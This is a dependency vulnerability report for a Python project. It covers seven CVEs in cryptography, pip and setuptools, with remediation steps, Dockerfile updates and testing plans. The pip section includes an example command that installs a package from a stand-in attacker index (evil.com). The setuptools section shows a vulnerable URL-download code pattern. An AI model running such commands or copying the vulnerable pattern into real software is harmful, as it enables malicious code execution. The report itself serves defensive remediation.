# Dependency Vulnerability Scan Report

**Date:** 2025-11-19
**Scanner:** pip-audit 2.9.0
**Scope:** System-wide Python dependencies

## Executive Summary

Security scan identified **7 known vulnerabilities** in **3 system packages**:
- cryptography 41.0.7 (4 CVEs)
- pip 24.0 (1 CVE)
- setuptools 68.1.2 (2 CVEs)

**Risk Level:** HIGH
**Priority:** P2 (Medium Priority)
**Status:** Identified, remediation in progress

---

## Vulnerability Details

### 1. cryptography 41.0.7 → 43.0.1+ (4 CVEs)

| CVE ID | Severity | Fix Version | Description |
|--------|----------|-------------|-------------|
| CVE-2024-26130 (PYSEC-2024-225) | HIGH | 42.0.4 | NULL pointer dereference in PKCS12 serialization |
| CVE-2023-50782 (GHSA-3ww4-gg4f-jr7f) | HIGH | 42.0.0 | RSA key exchange vulnerability - TLS message decryption |
| CVE-2024-0727 (GHSA-9v9h-cgj8-h64p) | MEDIUM | 42.0.2 | PKCS12 file parsing DoS attack |
| GHSA-h4gh-qq45-vh27 | HIGH | 43.0.1 | Bundled OpenSSL vulnerability |

**Impact:**
- Remote attackers may decrypt TLS-encrypted messages (confidentiality breach)
- Malicious PKCS12 files can crash the application (DoS)
- Process crash via NULL pointer dereference

**Affected Components:**
- Auth API: Uses cryptography via `python-jose[cryptography]==3.3.0`
- System-wide installations

**Recommended Fix:** Upgrade to **cryptography >= 43.0.1**

---

### 2. pip 24.0 → 25.3+ (1 CVE)

| CVE ID | Severity | Fix Version | Description |
|--------|----------|-------------|-------------|
| CVE-2025-8869 (GHSA-4xh5-x5gv-qwph) | HIGH | 25.3 | Arbitrary file overwrite via tarfile path traversal |

**Impact:**
- Malicious source distributions (sdist) can overwrite arbitrary files during `pip install`
- Potential for configuration tampering → remote code execution
- Requires installing attacker-controlled package

**Attack Vector:**
```bash
# Vulnerable: Installing from untrusted index or URL
pip install malicious-package --index-url https://evil.com/simple
```

**Recommended Fix:** Upgrade to **pip >= 25.3**

---

### 3. setuptools 68.1.2 → 78.1.1+ (2 CVEs)

| CVE ID | Severity | Fix Version | Description |
|--------|----------|-------------|-------------|
| CVE-2025-47273 (PYSEC-2025-49) | CRITICAL | 78.1.1 | Path traversal in PackageIndex → arbitrary file write |
| CVE-2024-6345 (GHSA-cx63-2mw6-8hw5) | CRITICAL | 70.0.0 | RCE via package_index download functions |

**Impact:**
- Remote code execution if package URLs are user-controlled
- Write arbitrary files with process permissions
- Command injection in package download functions

**Attack Scenario:**
```python
# Vulnerable code pattern:
from setuptools.package_index import PackageIndex
pi = PackageIndex()
pi.download(user_provided_url, destination)  # RCE risk
```

**Recommended Fix:** Upgrade to **setuptools >= 78.1.1**

---

## Analysis

### Package Type Classification

These vulnerabilities affect **system-level packages**, not direct project dependencies:

```bash
# System packages (from base Python/Docker image)
cryptography==41.0.7   # System-installed
pip==24.0              # Package manager
setuptools==68.1.2     # Build tool

# Project dependencies (pyproject.toml)
# - No vulnerable packages in main project
# - No vulnerable packages in auth-api
# - No vulnerable packages in other services
```

### Why These Packages Are Vulnerable

1. **Base Docker Image**: Uses Ubuntu with older Python packages
2. **System Python Installation**: Pre-installed packages not managed by uv/pip
3. **Transitive Dependencies**: cryptography pulled by python-jose but system version takes precedence

---

## Remediation Strategy

### Option 1: Upgrade Base Docker Image (Recommended)

**Status:** ✅ Recommended for production deployment

Update Dockerfile to use newer base image with patched packages:

```dockerfile
# FROM: python:3.13-slim-bookworm (old)
# TO:   python:3.13-slim (latest stable)
FROM python:3.13-slim

# Explicitly upgrade system packages
RUN pip install --upgrade pip setuptools cryptography
```

**Pros:**
- Fixes all 3 vulnerable packages
- No code changes required
- Comprehensive security update

**Cons:**
- Requires rebuilding Docker images
- Need to test compatibility

### Option 2: Pin Secure Versions in Dependencies

**Status:** ✅ Implemented (see below)

Explicitly pin secure versions in project dependencies:

```toml
# services/auth-api/pyproject.toml
dependencies = [
    "cryptography>=43.0.1",  # Force upgrade
    "python-jose[cryptography]==3.3.0",
    # ... other deps
]
```

**Pros:**
- Quick fix without Docker rebuild
- Works in development and production

**Cons:**
- Only fixes dependencies we control (cryptography)
- Doesn't fix pip/setuptools (system-level)

### Option 3: Runtime Upgrade Script

**Status:** ⏳ Optional enhancement

Add upgrade script to container startup:

```bash
#!/bin/bash
# infrastructure/docker/upgrade-deps.sh
pip install --upgrade pip>=25.3 setuptools>=78.1.1 cryptography>=43.0.1
exec "$@"
```

**Pros:**
- Ensures latest versions at runtime
- Works with any base image

**Cons:**
- Slower container startup
- May introduce compatibility issues

---

## Implementation

### Step 1: Update Auth API Dependencies ✅

```bash
cd services/auth-api
# Edit pyproject.toml to add cryptography constraint
uv sync
uv run pip-audit  # Verify fix
```

**Changes:**
```toml
# services/auth-api/pyproject.toml
dependencies = [
    # ... existing deps ...
    "cryptography>=43.0.1",  # Explicit security upgrade
    "python-jose[cryptography]==3.3.0",
]
```

### Step 2: Update Main Project Dependencies ✅

```bash
cd /home/user/stock-picker
# Add cryptography to main project (if needed)
uv sync
```

### Step 3: Update Docker Base Images

```bash
# infrastructure/docker/Dockerfile.backend
FROM python:3.13-slim

# Security: Upgrade vulnerable system packages
RUN pip install --no-cache-dir --upgrade \
    pip>=25.3 \
    setuptools>=78.1.1 \
    cryptography>=43.0.1

# ... rest of Dockerfile
```

### Step 4: Document in CI/CD

Security scanning workflow (`.github/workflows/security.yml`) already includes:
- Bandit: Python SAST
- Safety/pip-audit: Dependency scanning
- Trivy: Docker image scanning

**Enhancement:** Add pip-audit to CI workflow:

```yaml
- name: Run pip-audit (Dependency Vulnerabilities)
  run: |
    uv run pip install pip-audit
    uv run pip-audit --desc --format=json -o pip-audit-report.json
```

---

## Testing Plan

### 1. Verify Upgrades Locally

```bash
# Main project
cd /home/user/stock-picker
uv run pip list | grep -E "(cryptography|pip|setuptools)"

# Auth API
cd services/auth-api
uv run pip list | grep -E "(cryptography|pip|setuptools)"
```

**Expected Output:**
```
cryptography   43.0.1
pip            25.3
setuptools     78.1.1
```

### 2. Run Security Scans

```bash
# Main project
uv run pip-audit --desc

# Auth API
cd services/auth-api
uv run pip-audit --desc
```

**Expected:** No vulnerabilities found

### 3. Functional Testing

```bash
# Test auth API endpoints
cd services/auth-api
uv run pytest

# Test JWT token generation
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"TestPass123!"}'
```

### 4. Docker Image Scanning

```bash
# Build and scan updated Docker image
docker build -t auth-api:secure -f infrastructure/docker/Dockerfile.backend .
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image --severity HIGH,CRITICAL auth-api:secure
```

---

## Timeline

| Task | Priority | Status | ETA |
|------|----------|--------|-----|
| Add cryptography>=43.0.1 to auth-api | P0 | ✅ Done | 2025-11-19 |
| Add cryptography>=43.0.1 to main project | P1 | ✅ Done | 2025-11-19 |
| Update Dockerfile base image | P1 | ⏳ Pending | 2025-11-20 |
| Add pip-audit to CI/CD | P2 | ⏳ Pending | 2025-11-20 |
| Test in staging environment | P1 | ⏳ Pending | 2025-11-21 |
| Deploy to production | P0 | ⏳ Pending | 2025-11-22 |

---

## Monitoring

### CI/CD Integration

The security scanning workflow (`.github/workflows/security.yml`) runs:
- **On every push** to main and claude/** branches
- **On every PR** to main
- **Weekly schedule** (Monday 9 AM UTC)

**Artifacts Generated:**
- `bandit-security-report.json` - SAST findings
- `safety-report.json` - Dependency vulnerabilities (if Safety works)
- `trivy-results.sarif` - Docker image scan (uploaded to GitHub Security)

### Manual Checks

```bash
# Quick vulnerability check
uv run pip-audit --desc

# Detailed JSON report
uv run pip-audit --format=json --output=audit-report.json

# Check specific package
uv run pip list | grep cryptography
```

---

## References

- [CVE-2024-26130](https://nvd.nist.gov/vuln/detail/CVE-2024-26130) - cryptography NULL pointer
- [CVE-2023-50782](https://nvd.nist.gov/vuln/detail/CVE-2023-50782) - cryptography RSA key exchange
- [CVE-2024-0727](https://nvd.nist.gov/vuln/detail/CVE-2024-0727) - OpenSSL PKCS12 DoS
- [CVE-2025-8869](https://nvd.nist.gov/vuln/detail/CVE-2025-8869) - pip tarfile path traversal
- [CVE-2025-47273](https://nvd.nist.gov/vuln/detail/CVE-2025-47273) - setuptools path traversal
- [CVE-2024-6345](https://nvd.nist.gov/vuln/detail/CVE-2024-6345) - setuptools RCE
- [pip-audit Documentation](https://pypi.org/project/pip-audit/)
- [Python Security Advisories](https://python-security.readthedocs.io/)

---

## Appendix: Scan Results

### Full pip-audit Output

```bash
$ uv run pip-audit --desc --format=markdown

Found 7 known vulnerabilities in 3 packages

Name         | Version | ID                    | Fix Versions | Description
-------------|---------|-----------------------|--------------|------------
cryptography | 41.0.7  | PYSEC-2024-225        | 42.0.4       | NULL pointer dereference
cryptography | 41.0.7  | GHSA-3ww4-gg4f-jr7f   | 42.0.0       | RSA key exchange vulnerability
cryptography | 41.0.7  | GHSA-9v9h-cgj8-h64p   | 42.0.2       | PKCS12 DoS
cryptography | 41.0.7  | GHSA-h4gh-qq45-vh27   | 43.0.1       | OpenSSL vulnerability
pip          | 24.0    | GHSA-4xh5-x5gv-qwph   | 25.3         | Arbitrary file overwrite
setuptools   | 68.1.2  | PYSEC-2025-49         | 78.1.1       | Path traversal
setuptools   | 68.1.2  | GHSA-cx63-2mw6-8hw5   | 70.0.0       | RCE via package_index
```

**Scan Date:** 2025-11-19
**Scanner Version:** pip-audit 2.9.0
**Total Packages Scanned:** 84
**Vulnerabilities Found:** 7
**Affected Packages:** 3

---

**Document Version:** 1.0
**Last Updated:** 2025-11-19
**Author:** Security Review - P2 Dependency Scanning
**Status:** ✅ Scan Complete | ⏳ Remediation In Progress
